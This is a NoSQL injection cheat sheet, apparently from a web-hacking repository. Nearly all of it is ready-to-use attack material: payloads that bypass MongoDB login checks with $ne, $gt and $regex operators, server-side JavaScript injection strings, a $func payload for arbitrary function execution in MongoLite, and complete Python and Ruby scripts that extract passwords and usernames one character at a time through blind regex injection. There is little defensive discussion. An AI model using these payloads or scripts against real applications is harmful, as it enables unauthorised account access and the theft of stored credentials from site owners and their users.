# NoSQL Injection
## Exploit
**PHP**

The exploits are based in adding an Operator
```php
username[$ne]=1$password[$ne]=1 #<Not Equals>
username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
username[$eq]=admin&password[$ne]=1 #<Equals>
username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
username[$ne]=admin&pass[$gt]=s #<Greater Than>
username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code

```

### Authentication Bypass
Basic authentication bypass using not equal ($ne) or greater ($gt)
```javascript
in DATA
username[$ne]=toto&password[$ne]=toto
login[$regex]=a.*&pass[$ne]=lol
login[$gt]=admin&login[$lt]=test&pass[$ne]=1
login[$nin][]=admin&login[$nin][]=test&pass[$ne]=toto

in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}

```
### SQL - Mongo
```html
Normal sql: ' or 1=1-- -
Mongo sql: ' || 1==1//    or    ' || 1==1%00

```

### Extract length information
```javascript
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}

```
### Extract data information
```javascript
in URL
username[$ne]=toto&password[$regex]=m.{2}
username[$ne]=toto&password[$regex]=md.{1}
username[$ne]=toto&password[$regex]=mdp

username[$ne]=toto&password[$regex]=m.*
username[$ne]=toto&password[$regex]=md.*

in JSON
{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}
{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}

```
Extract data with "in"
```javascript
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}

```

### SQL - Mongo
```html
/?search=admin' && this.password%00 --> Check if the field password exists
/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
/?search=admin' && this.password && this.password.match(/^a.*$/)%00
/?search=admin' && this.password && this.password.match(/^b.*$/)%00
/?search=admin' && this.password && this.password.match(/^c.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
...
/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found

```

### SSJI
```javascript
';return 'a'=='a' && ''=='
";return 'a'=='a' && ''=='
0;return true

```

### PHP Arbitrary Function Execution
Using the $func operator of the [MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite) library (used by default) it might be possible to execute and arbitrary function as in [this report](https://swarm.ptsecurity.com/rce-cockpit-cms/).

```javascript
"user":{"$func": "var_dump"}

```
![123](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/1044d5ff-11cf-4808-8c70-94382fbf55ae)

### Get info from different collection
It's possible to use [$lookup](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/) to get info from a different collection. In the following example, we are reading from a different collection called users and getting the results of all the entries with a password matching a wildcard.
```javascript
[
  {
    "$lookup":{
      "from": "users",
      "as":"resultado","pipeline": [
        {
          "$match":{
            "password":{
              "$regex":"^.*"
            }
          }
        }
      ]
    }
  }
]

```

## Blind NoSQL

```python
import requests, string

alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"

flag = ""
for i in range(21):
    print("[i] Looking for char number "+str(i+1))
    for char in alphabet:
        r = requests.get("http://chall.com?param=^"+flag+char)
        if ("<TRUE>" in r.text):
            flag += char
            print("[+] Flag: "+flag)
            break

```
```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = {'ids': payload}, verify = False)
            if 'OK' in r.text:
                print("Found one more char : %s" % (password+c))
                password += c


```

### POST with JSON body
python script
```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'OK' in r.text or r.status_code == 302:
                print("Found one more char : %s" % (password+c))
                password += c


```
### POST with urlencoded body
python script
```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password=""
u="http://example.org/login"
headers={'content-type': 'application/x-www-form-urlencoded'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|','&','$']:
            payload='user=%s&pass[$regex]=^%s&remember=on' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if r.status_code == 302 and r.headers['Location'] == '/dashboard':
                print("Found one more char : %s" % (password+c))
                password += c


```
### GET
python script
```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username='admin'
password=''
u='http://example.org/login'

while True:
  for c in string.printable:
    if c not in ['*','+','.','?','|', '#', '&', '$']:
      payload=f"?username={username}&password[$regex]=^{password + c}"
      r = requests.get(u + payload)
      if 'Yeah' in r.text:
        print(f"Found one more char : {password+c}")
        password += c


```
ruby script
```ruby
require 'httpx'

username = 'admin'
password = ''
url = 'http://example.org/login'
# CHARSET = (?!..?~).to_a # all ASCII printable characters
CHARSET = [*'0'..'9',*'a'..'z','-'] # alphanumeric + '-'
GET_EXCLUDE = ['*','+','.','?','|', '#', '&', '$']
session = HTTPX.plugin(:persistent)

while true
  CHARSET.each do |c|
    unless GET_EXCLUDE.include?(c)
      payload = "?username=#{username}&password[$regex]=^#{password + c}"
      res = session.get(url + payload)
      if res.body.to_s.match?('Yeah')
        puts "Found one more char : #{password + c}"
        password += c
      end
    end
  end
end

```
## MongoDB Payloads
```html
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1'
1, $where: '1 == 1'
{ $ne: 1 }
', $or: [ {}, { 'a':'a
' } ], $comment:'successful MongoDB injection'
db.injection.insert({success:1});
db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
|| 1==1
' && this.password.match(/.*/)//+%00
' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00
'%20%26%26%20this.passwordzz.match(/.*/)//+%00
{$gt: ''}
[$ne]=1
';return 'a'=='a' && ''=='
";return(true);var xyz='a
0;return true

```

## Tools
* https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
* https://github.com/C4l1b4n/NoSQL-Attack-Suite

### Brute-force login usernames and passwords from POST login
This is a simple script that you could modify but the previous tools can also do this task.
```python
import requests
import string

url = "http://example.com"
headers = {"Host": "exmaple.com"}
cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
def get_password(username):
    print("Extracting password of "+username)
    params = {"username":username, "password[$regex]":"", "login": "login"}
    password = "^"
    while True:
        for c in possible_chars:
            params["password[$regex]"] = password + c + ".*"
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
            if int(pr.status_code) == 302:
                password += c
                break
        if c == possible_chars[-1]:
            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
            return password[1:].replace("\\", "")

def get_usernames():
    usernames = []
    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
    for c in possible_chars:
        username = "^" + c
        params["username[$regex]"] = username + ".*"
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        if int(pr.status_code) == 302:
            print("Found username starting with "+c)
            while True:
                for c2 in possible_chars:
                    params["username[$regex]"] = username + c2 + ".*"
                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
                        username += c2
                        print(username)
                        break

                if c2 == possible_chars[-1]:
                    print("Found username: "+username[1:])
                    usernames.append(username[1:])
                    break
    return usernames


for u in get_usernames():
    get_password(u)

```




















